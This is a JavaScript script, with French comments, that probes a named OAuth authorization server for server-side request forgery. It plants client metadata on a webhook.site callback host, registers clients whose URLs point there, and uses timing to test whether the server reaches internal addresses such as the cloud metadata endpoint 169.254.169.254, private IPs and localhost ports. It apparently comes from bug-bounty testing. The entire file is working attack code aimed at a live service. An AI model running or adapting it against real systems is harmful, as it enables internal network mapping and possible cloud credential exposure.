const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const CH = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");

const log = async (label) => {
  const r = await fetch("https://webhook.site/token/" + UUID + "/requests?sorting=newest");
  const j = await r.json();
  console.log("  " + label);
  for (const q of (j.data || []).slice(0, 6)) console.log("      " + q.method + " " + q.url.slice(0, 100) + "  | UA: " + ((q.headers?.["user-agent"] || [])[0] || "?"));
  if (!(j.data || []).length) console.log("      (aucune requete)");
  await sleep(600);
  return j;
};

async function authorize(clientId, label, redirect = BASE + "/cb") {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", clientId);
  u.searchParams.set("redirect_uri", redirect);
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  const t0 = Date.now();
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  console.log("  " + label.padEnd(46) + String(Date.now() - t0 + "ms").padStart(7) + "  " + (loc.includes("/oauth/consent") ? "CONSENT" : (loc.match(/code=([^&]+)/) || [])[1]));
  await sleep(3500); // on espace pour eviter le rate limit
  return loc;
}

console.log("=== A) ATTRIBUTION : quel endpoint declenche le fetch ? (chemin unique) ===");
const P = "/cimd-attr-" + Date.now();
await fetch("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: JSON.stringify({ client_id: BASE + P, client_name: "attr", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" }), default_content_type: "application/json" }) });
await sleep(600);
console.log("  document publie sur " + BASE + P);
await authorize(BASE + P, "AUTHORIZE avec client_id=URL unique");
await log("    -> requetes vues par le webhook apres l authorize :");
await sleep(2000);
const before = (await (await fetch("https://webhook.site/token/" + UUID + "/requests?sorting=newest")).json()).total;
const P2 = "/dcr-attr-" + Date.now();
const reg = await fetch(AS + "/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: "attr-dcr", client_uri: BASE + P2, redirect_uris: [BASE + "/cb"] }) });
console.log("  DCR avec client_uri=" + BASE + P2 + " -> HTTP " + reg.status + " " + (await reg.text()).slice(0, 150).replace(/\s+/g, " "));
await sleep(2500);
await log("    -> requetes vues par le webhook apres le DCR :");

console.log("\n=== B) le document est-il fetch plusieurs fois ? (authorize + echange) ===");
const j = await (await fetch("https://webhook.site/token/" + UUID + "/requests?sorting=newest")).json();
const counts = {};
for (const q of j.data || []) { const k = (q.headers?.["user-agent"] || [])[0] || "?"; counts[k] = (counts[k] || 0) + 1; }
console.log("  requetes recues par UA : " + JSON.stringify(counts) + " (total=" + j.total + ")");

console.log("\n=== C) portee interne : mesure propre (espacement 4s, 2 echantillons) ===");
const INT = [
  ["webhook externe (temoin)", BASE],
  ["IMDS 169.254.169.254", "http://169.254.169.254/latest/meta-data/"],
  ["TEST-NET 192.0.2.1", "http://192.0.2.1/"],
  ["10.255.255.1 (prive)", "http://10.255.255.1/"],
  ["127.0.0.1:3000", "http://127.0.0.1:3000/"],
  ["127.0.0.1:53682 (MCP)", "http://127.0.0.1:53682/.well-known/oauth-protected-resource/mcp"],
  ["127.0.0.1:8080", "http://127.0.0.1:8080/"],
  ["hote inexistant", "https://hote-inexistant-zzz.invalid/"],
];
for (const [n, url] of INT) {
  const ts = [];
  for (let i = 0; i < 2; i++) { const t0 = Date.now(); try { const r = await fetch(url, { redirect: "manual", signal: AbortSignal.timeout(20000) }); await r.text(); } catch {} ts.push(Date.now() - t0); await sleep(1500); }
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", url);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb");
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  const t1 = Date.now();
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  const asLat = Date.now() - t1;
  const err = (loc.match(/code=([^&]+)/) || [])[1] || (loc.includes("consent") ? "CONSENT" : "?");
  console.log("  " + n.padEnd(32) + "latence AS=" + String(asLat + "ms").padStart(7) + "  err=" + err + "   (mon poste: " + ts.join(",") + "ms)");
  await sleep(4000);
}
